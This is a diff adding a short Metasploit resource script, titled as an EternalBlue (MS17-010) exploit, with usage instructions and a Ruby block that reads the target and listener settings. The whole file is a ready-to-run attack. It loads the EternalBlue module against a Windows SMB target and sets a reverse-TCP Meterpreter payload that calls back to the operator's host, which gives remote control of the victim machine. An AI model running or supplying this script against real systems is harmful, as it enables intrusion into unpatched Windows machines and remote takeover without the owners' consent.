@@ -1,0 +1,24 @@
+# EternalBlue (MS17-010) exploit
+# Usage: msfconsole -r eternalblue.rc TARGET=<ip> LHOST=<your_ip>
+
+<ruby>
+target = framework.datastore['TARGET'] || ENV['TARGET']
+lhost = framework.datastore['LHOST'] || ENV['LHOST'] || '10.0.0.1'
+lport = framework.datastore['LPORT'] || ENV['LPORT'] || '4444'
+
+if target.nil? || target.empty?
+    print_error("TARGET not set. Use: msfconsole -r eternalblue.rc TARGET=<ip>")
+    return
+end
+
+print_status("Target: #{target}")
+print_status("LHOST: #{lhost}")
+print_status("LPORT: #{lport}")
+</ruby>
+
+use exploit/windows/smb/ms17_010_eternalblue
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set RHOSTS ${TARGET}
+set LHOST ${LHOST}
+set LPORT ${LPORT}
+exploit -j
